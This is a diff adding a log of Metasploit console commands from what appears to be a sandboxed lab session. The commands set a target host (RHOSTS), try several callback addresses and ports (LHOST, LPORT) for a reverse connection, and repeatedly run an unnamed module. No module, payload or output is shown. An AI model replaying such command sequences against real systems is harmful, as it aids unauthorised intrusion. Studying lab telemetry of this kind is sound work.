@@ -1,0 +1,17 @@
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:19:11.537Z", "cmd_type": "msf-command", "cmd": "help"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:19:46.325Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:19:56.131Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:20:02.524Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:20:34.239Z", "cmd_type": "msf-command", "cmd": "set LPORT 5555"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:20:35.314Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:20:42.712Z", "cmd_type": "msf-command", "cmd": "set LPORT 4444"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:20:50.030Z", "cmd_type": "msf-command", "cmd": "set LHOST localhost"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:20:54.661Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:21:09.225Z", "cmd_type": "msf-command", "cmd": "set LHOST 172.18.1.5"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:21:13.613Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:21:19.696Z", "cmd_type": "msf-command", "cmd": "set LHOST localhost"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:21:23.687Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:22:08.029Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:22:20.793Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:22:59.152Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "31", "timestamp_str": "2021-04-22T15:24:17.949Z", "cmd_type": "msf-command", "cmd": "exit"}
